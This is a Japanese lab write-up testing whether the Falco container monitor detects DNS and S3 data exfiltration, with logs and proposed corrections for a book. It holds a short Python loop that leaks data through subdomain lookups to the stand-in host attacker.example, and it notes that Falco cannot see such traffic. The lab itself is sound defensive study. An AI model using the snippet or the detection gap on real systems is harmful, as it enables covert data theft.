## Lab 17: データの持ち出し経路（DNS exfil, S3等）

- MITRE ATT&CK for Containers: T1041, T1048
- 前提: Lab 16で得た（想定上の）クレデンシャルを使い、S3へのデータ持ち出しと、DNS exfiltrationを試みる

### 最重要の実証結果：DNS exfiltrationはFalcoの構造上、原理的に検知できない

本文は「短時間に大量の一意なサブドメインへのクエリが異常として浮かび上がる」という標準ルール「Excessive DNS Queries」を想定していたが、これは**標準ルールに存在しないだけでなく、原理的にFalcoのsyscall監視では実現不可能**であることが実機で判明した。

```python
for i in range(60):
    socket.gethostbyname(f'{i:04x}secretdata.attacker.example')
```

デバッグ用ルールでsyscallを直接確認したところ、**60回すべてのDNSクエリが、宛先`10.96.0.10:53`（クラスタ内部のCoreDNS）への全く同一のUDP接続として記録されていた**：

```
fd.name=10.244.2.30:56651->10.96.0.10:53  （以下59回、宛先は常に同一）
```

これは、`google.com`を引く正規のDNSルックアップも、`4a6fsecretdata.attacker.example`を引く悪性のDNS exfiltrationも、**コンテナ側のsyscallレベルでは文字どおり区別がつかない**ことを意味する。**実際に流出させているデータ（サブドメイン名）はDNSパケットのペイロード内にあり、Falcoのsyscallフックはパケット内容までは見ていない**。

これはCNIのパケットキャプチャ（本文で言及したtcpdump/flow log）か、**CoreDNS自体のクエリログ**（本書がこれまで挙げていた4つのデータソースのどれとも異なる、**5つ目のデータソース**）でなければ検知できない。

### S3持ち出しの検証：本物のAWS接続は無いが、興味深い副産物

実際のAWS認証情報が無いため`aws s3 cp`はエラーで終わるが、興味深いことに**`aws` CLIツール自体が、認証情報が見つからない場合に自動的にEC2インスタンスメタデータAPIへフォールバックしようとする**挙動を実機で観測できた：

```
12:05:14.066474170: Critical Contact cloud metadata service from container (command=aws
  connection=10.244.2.3:53072->169.254.169.254:80 ...)
```

これはLab 16で作ったカスタムルールが、意図せず自然に発火した例——**awsコマンドを実行するだけで、Lab 16の攻撃パターンが副次的に再現される**という、クラウドSDKの標準的な認証チェーンの挙動を体現する結果だった。

一方、**「AWS CLI Executed in Container」という本文の標準ルールは存在しなかった**。`grep -i aws`でヒットしたのは、特定のnginxログ転送パターンを除外するための例外条件と、`Find AWS Credentials`（認証情報ファイルの探索を検知するルールで、s3 cp実行そのものとは別物）のみ。

### 考察（本文修正用）

- DNS exfiltrationのくだりは全面的に書き直しが必要。「標準ルールでは検知できないが、カスタムルールなら検知できる」ではなく、**「Falcoのアーキテクチャそのものがこの種の検知に向いていない」**という、より根本的な限界として記述する。
- 「AWS CLI Executed in Container」ルール名は削除し、実在する`Find AWS Credentials`ルールに言及を差し替える。
- awsコマンドの認証チェーンが自動的にメタデータAPIにフォールバックする、という実務的に重要な副産物を追加する。
